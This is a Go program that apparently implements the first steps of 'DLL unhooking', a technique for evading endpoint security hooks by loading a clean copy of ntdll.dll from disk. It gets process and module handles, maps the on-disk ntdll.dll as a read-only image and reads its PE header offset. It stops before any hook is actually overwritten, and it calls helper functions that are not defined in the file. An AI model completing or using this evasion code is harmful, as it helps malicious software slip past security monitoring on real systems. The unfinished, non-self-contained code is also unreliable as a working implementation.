package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

type MODULEINFO struct {
	BaseOfDll   uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

type PIMAGE_DOS_HEADER struct {
	e_magic    uint16
	e_cblp     uint16
	e_cp       uint16
	e_crlc     uint16
	e_cparhdr  uint16
	e_minalloc uint16
	e_maxalloc uint16
	e_ss       uint16
	e_sp       uint16
	e_csum     uint16
	e_ip       uint16
	e_cs       uint16
	e_lfarlc   uint16
	e_ovno     uint16
	e_res      [4]uint16
	e_oemid    uint16
	e_oeminfo  uint16
	e_res2     [10]uint16
	e_lfanew   uint32
}

func main() {

	fmt.Println("[+] DLL Unhooking.")

	hProcess := GetCurrentProcess()
	hNtdllModule := GetModuleHandleA("ntdll.dll")

	fmt.Printf("[+] Process handle: %x\n", hProcess)
	fmt.Printf("[+] Ntdll module handle: %x\n", hNtdllModule)

	var modinfo MODULEINFO

	fmt.Printf("[+] Size of MODULEINFO structure: %d\n", uint32(unsafe.Sizeof(modinfo)))

	res := GetModuleInformation(hProcess, hNtdllModule, &modinfo, uint32(unsafe.Sizeof(modinfo)))

	if !res {
		fmt.Println("[!] Could not obtain module information, aborting...")
		return
	}
	fmt.Printf("[+] Obtained module information: %x\n", modinfo)

	hNtdllFile := CreateFileA("c:\\windows\\system32\\ntdll.dll", syscall.GENERIC_READ, syscall.FILE_SHARE_READ, 0, syscall.OPEN_EXISTING, 0, 0)
	if hNtdllFile == 0 {
		fmt.Println("[!] Could not obtain ntdll.dll file handle, aborting...")
		return
	}
	fmt.Printf("[+] Obtained ntdll.dll file handle: %x\n", hNtdllFile)

	flProt := uint32(0x02 | 0x1000000) // PAGE_READONLY (0x02) | SEC_IMAGE (0x1000000)
	hNtdllFileMapping := CreateFileMappingA(hNtdllFile, 0, flProt, 0, 0, 0)
	if hNtdllFileMapping == 0 {
		fmt.Println("[!] Could not obtain ntdll.dll file mapping, aborting...")
		return
	}
	fmt.Printf("[+] Obtained ntdll.dll file mapping: %x\n", hNtdllFileMapping)

	viewOfFilePtr := MapViewOfFile(hNtdllFileMapping, syscall.FILE_MAP_READ, 0, 0, 0)
	if viewOfFilePtr == 0 {
		fmt.Println("[!] Could not obtain view of file with file mapping, aborting...")
		return
	}
	fmt.Printf("[+] Obtained view of file, start addr: %x\n", viewOfFilePtr)

	ntdllHeader := (*PIMAGE_DOS_HEADER)(unsafe.Pointer(modinfo.BaseOfDll))
	fmt.Printf("[+] NtDll header e_lfanew val: %x\n", ntdllHeader.e_lfanew)

	CloseHandle(hNtdllFile)
	CloseHandle(hNtdllFileMapping)
	CloseHandle(hProcess)
}
